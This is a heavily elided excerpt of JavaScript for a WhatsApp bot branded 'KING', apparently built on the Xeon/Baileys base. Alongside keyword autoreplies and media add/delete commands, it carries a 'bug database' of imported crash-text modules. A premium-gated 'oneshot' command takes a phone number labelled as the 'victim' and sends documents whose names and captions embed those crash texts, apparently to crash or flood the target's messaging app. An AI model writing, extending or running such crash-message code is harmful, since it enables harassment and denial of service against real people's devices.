...
//bug database
const { xeontext1 } = require('./king/kingtext1')
const { xeontext2 } = require('./king/kingtext2')
const { xeontext3 } = require('./king/kingtext3')
const { xeontext4 } = require('./king/kingtext4')
const { xeontext5 } = require('./king/kingtext5')
const { xeontext6 } = require('./king/kingtext6')
const { xeontext7 } = require('./king/kingtext7')
const { xeontext8 } = require('./king/kingtext8')
const { xeontext9 } = require('./king/kingtext9')
const { xeontext10 } = require('./king/kingtext10')
const { xeontext11 } = require('./king/kingtext11')
const wkwk = fs.readFileSync(`./king/x.mp3`)
const xsteek = fs.readFileSync(`./king/x.webp`)
const o = fs.readFileSync(`./king/o.jpg`)
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./kings/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
"jpegThumbnail": fs.readFileSync(`./king/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "👑 KING",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://f.uguu.se/BhFPUUTG.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
let audiobuffy = fs.readFileSync(`./kings/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./kings/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./kings/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./kings/video/${BhosdikaXeon}.mp4`)
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./kings/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./kings/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./kings/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
...
break
            case 'addvideo': {
                ...
                VideoXeon.push(q)
                await fsx.copy(delb, `./kings/video/${q}.mp4`)
            ...
            case 'delvideo': {
                ...
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./kings/video/${q}.mp4`)
            ...
            case 'addimage': {
                ...
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./kings/image/${q}.jpg`)
            ...
            case 'delimage': {
                ...
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./kings/image/${q}.jpg`)
            ...
            case 'addsticker': {
                ...
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./kings/sticker/${q}.webp`)
            ...
            case 'delsticker': {
                ...
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./kings/sticker/${q}.webp`)
            ...
            case 'addvn': {
                ...
                await fsx.copy(delb, `./kings/audio/${q}.mp3`)
            ...
            case 'delvn': {
                ...
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./kings/audio/${q}.mp3`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./kings/zip/${teks}.zip`)
...
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./kings/zip/${teks}.zip`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./kings/apk/${teks}.apk`)
...
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./kings/apk/${teks}.apk`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./kings/doc/${teks}.pdf`)
...
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./kings/doc/${teks}.pdf`)
...
case 'oneshot': {
	if (!isCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Usage .${command} 2348100835767`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 2348100835767`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348100835767") {
    return;
...
if (!isPremium) return replygcxeon(mess.prem)
if (!q) return replygcxeon(`Usage .${command} 2348100835767`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 2348100835767`)
...
await XeonBotInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "👑 KING" + xeontext1,
    'mimetype': "application/zip",
    'caption': "👑 KING" + xeontext1,
...
title: `Xeon's ur father`
  ...
  XeonBotInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `👑 KING${xeontext11}`,
      caption: `👑 KING ${xeontext11}`,
    },
...
if (typemenu === 'v1') {
                    ...
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./kings/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://f.uguu.se/BhFPUUTG.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
